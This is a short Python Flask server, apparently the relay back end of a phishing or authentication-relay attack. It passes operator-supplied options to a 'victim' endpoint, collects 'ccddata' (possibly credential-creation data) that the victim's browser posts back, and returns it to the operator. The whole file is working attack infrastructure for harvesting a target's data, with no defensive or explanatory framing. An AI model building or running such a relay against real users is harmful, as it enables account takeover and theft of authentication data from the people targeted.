from flask import *
from flask_cors import CORS
import os

app = Flask(__name__)
flpath='.' 
optionsfile=flpath+'/optionsfile.txt'
ccdfile=flpath+'/ccdfile.txt'

try:
	os.remove(optionsfile)
	os.remove(ccdfile)
except:
	pass

app = Flask(__name__)
CORS(app)


@app.route("/", methods=["GET","POST"])
def index():
	return "active"

@app.route("/victimreq", methods=["GET","POST"])
def victimreq():
	try:
		fl=open(optionsfile, 'r')
		txt=fl.read()
		fl.close()
		os.remove(optionsfile)
		return txt
	except:
		return ""
	
		
@app.route("/victimresp",methods=["GET","POST"])
def victimresp():
	data=request.form.get('ccddata')
	print(data)
	fl=open(ccdfile,'w')
	fl.write(data)
	fl.close()
	return "success"

def getccddata():
	while True:
		try:
			fl=open(ccdfile, 'r')
			txt=fl.read()
			fl.close()
			os.remove(ccdfile)
			return txt
		except:
			pass
			
def writeoptionsfile(options):
	fl=open(optionsfile,'w')
	fl.write(options)
	fl.close()
		
@app.route("/getoptions", methods=["GET","POST"])
def getoptions():
	optdatab64=request.form.get('data')
	writeoptionsfile(optdatab64)
	res1=getccddata()
	return res1	
	
if __name__=="__main__":
	app.run(host="0.0.0.0", port=5000)
